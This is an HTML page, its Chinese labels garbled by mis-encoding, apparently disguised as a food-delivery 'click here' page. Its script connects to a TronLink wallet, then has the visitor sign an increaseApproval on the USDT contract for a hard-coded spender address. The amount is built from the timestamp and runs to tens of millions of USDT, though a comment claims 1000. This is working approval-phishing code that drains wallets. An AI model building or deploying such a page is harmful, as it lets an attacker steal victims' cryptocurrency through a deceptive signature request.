<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>æµ‹è¯•</title>
  <style>
    body { font-family: sans-serif; padding: 20px; background: #f4f7f6; }
    .card { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    button { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    #connectBtn { background: #007bff; color: white; }
    #approveBtn { background: #28a745; color: white; }
    #approveBtn:disabled { background: #ccc; }
    #log { background: #333; color: #0f0; padding: 10px; border-radius: 4px; font-size: 12px; height: 150px; overflow-y: auto; white-space: pre-wrap; }
  </style>
</head>
<body>

<div class="card">
  <h3>å¤–å–ç‚¹å‡»</h3>
  <button id="connectBtn">ğŸ”Œ ç¬¬ä¸€æ­¥ï¼šæ‰‹åŠ¨è¿æ¥é’±åŒ…</button>
  <button id="approveBtn" disabled>âœ… ç¬¬äºŒæ­¥ï¼šç‚¹è¿™é‡Œ</button>

  <p style="font-size: 12px; color: #666;">çŠ¶æ€æ—¥å¿—ï¼š</p>
  <div id="log">ç­‰å¾…æ“ä½œ...</div>
</div>

<script>
  // ==========================================
  // é…ç½®å‚æ•°
  // ==========================================
  const USDT_ADDR = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // ä¸»ç½‘ USDT åœ°å€
  const SPENDER = "TAj9LrpzLpuHBQjYRoMppXSWah1et66UyW";  // æ¥æ”¶æˆæƒçš„åœ°å€

    const getFormattedTime = () => {
      const d = new Date();
      const f = (n) => String(n).padStart(2, '0');
      return `${d.getFullYear()}${f(d.getMonth() + 1)}${f(d.getDate())}.${f(d.getHours())}${f(d.getMinutes())}${f(d.getSeconds())}`;
  };
  const AMOUNT = getFormattedTime() * 1000000; // æˆæƒ 1000 USDT (ç²¾åº¦6)

  const logEl = document.getElementById('log');
  function logger(msg) { logEl.innerText += `\n[${new Date().toLocaleTimeString()}] ${msg}`; logEl.scrollTop = logEl.scrollHeight; }

  // ==========================================
  // 1. æ‰‹åŠ¨è¿æ¥é’±åŒ… (é€‚é…æ‰€æœ‰ TronLink ç‰ˆæœ¬)
  // ==========================================
  document.getElementById('connectBtn').onclick = async () => {
    if (!window.tronWeb) {
      logger("âŒ é”™è¯¯ï¼šæœªæ£€æµ‹åˆ° TronLinkã€‚è¯·åœ¨ TronLink APP æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚");
      return;
    }

    try {
      // è§¦å‘ TronLink æˆæƒå¼¹çª—
      const res = await window.tronWeb.request({ method: 'tron_requestAccounts' });

      if (res && res.code === 200) {
        const addr = window.tronWeb.defaultAddress.base58;
        logger(`âœ… è¿æ¥æˆåŠŸï¼åœ°å€: ${addr}`);
        document.getElementById('approveBtn').disabled = false;
        document.getElementById('connectBtn').innerText = "å·²è¿æ¥";
      } else {
        logger("âš ï¸ ç”¨æˆ·æ‹’ç»äº†è¿æ¥è¯·æ±‚");
      }
    } catch (e) {
      // æŸäº›è€ç‰ˆæœ¬ä¸æ”¯æŒ request æ–¹æ³•ï¼Œå°è¯•ç›´æ¥è¯»å–
      if (window.tronWeb.defaultAddress.base58) {
        logger(`âœ… è¿æ¥æˆåŠŸ (é€šè¿‡æ—§ç‰ˆæ¨¡å¼): ${window.tronWeb.defaultAddress.base58}`);
        document.getElementById('approveBtn').disabled = false;
      } else {
        logger("âŒ è¿æ¥å¤±è´¥: " + e.message);
      }
    }
  };

  // ==========================================
  // 2. è§¦å‘æ™ºèƒ½åˆçº¦ (åŸºäºä½ æä¾›çš„æ–‡æ¡£æ¨¡æ¿ä¿®æ”¹)
  // ==========================================
  document.getElementById('approveBtn').onclick = async () => {
    logger("â³ æ­£åœ¨è¯·æ±‚æˆæƒï¼Œè¯·åœ¨é’±åŒ…å¼¹çª—ä¸­ç¡®è®¤...");

    try {
      // åœ¨ DApp ç¯å¢ƒä¸­ï¼Œwindow.tronWeb å·²ç»ç”±æ’ä»¶åˆå§‹åŒ–å¥½äº†
      // æ— éœ€ä¼ å…¥ç§é’¥å’Œ fullHost
      const tronWeb = window.tronWeb;

      // 1. è·å–åˆçº¦å®ä¾‹ (æ— éœ€æ‰‹åŠ¨è¾“å…¥é•¿ä¸² ABIï¼ŒTronWeb è‡ªåŠ¨æ‹‰å–æ ‡å‡† TRC20 ABI)
      let instance = await tronWeb.contract().at(USDT_ADDR);

      // 2. æ‰§è¡Œ approve æ–¹æ³•
      // ä½¿ç”¨ .send() ä¼šå”¤èµ·ç”¨æˆ·çš„é’±åŒ…ç­¾åå¼¹çª—
      let result = await instance.increaseApproval(
          SPENDER,
          AMOUNT
      ).send({
          feeLimit: 100_000_000, // 100 TRX é™é¢
          callValue: 0,
          shouldPollResponse: false // DApp ç«¯å»ºè®®è®¾ä¸º falseï¼Œæå‡ç”¨æˆ·äº¤äº’é€Ÿåº¦
      });

      // 3. è¿”å›ç»“æœé€šå¸¸æ˜¯äº¤æ˜“å“ˆå¸Œ (Transaction ID)
      if (result) {
        logger(`ğŸ‰ æˆæƒæŒ‡ä»¤å·²å‘é€æˆåŠŸï¼\näº¤æ˜“ ID: ${result}`);
        console.log("Transaction ID:", result);
      }

    } catch (error) {
      console.error("trigger smart contract error", error);
      let msg = error.message || (typeof error === 'string' ? error : "ç”¨æˆ·å–æ¶ˆæˆ–ç¯å¢ƒé”™è¯¯");
      logger(`âŒ æˆæƒå¤±è´¥: ${msg}`);
    }
  };
</script>

</body>
</html>
